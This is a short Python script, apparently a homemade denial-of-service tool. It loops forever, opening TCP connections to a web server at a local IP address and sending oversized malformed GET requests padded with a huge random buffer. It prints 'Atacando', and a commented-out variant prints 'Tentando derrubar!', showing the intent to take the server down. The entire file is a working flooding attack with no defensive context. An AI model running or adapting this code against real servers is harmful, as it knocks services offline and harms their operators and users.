import requests
import socket
import random


buffer = random._urandom(2048) * 100000

# ploads = {'things': buffer}


while 0 < 1:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	sock.connect(("192.168.0.240", 80))

	sock.send(str.encode("GET ") + buffer + str.encode(" HTTP/1.1 \r\n"))

	response = sock.recv(4096)

	print("Atacando")




# while 0 < 1:
# 	r = requests.get('http://192.168.0.240/',params=ploads)
# 	print("Tentando derrubar!")
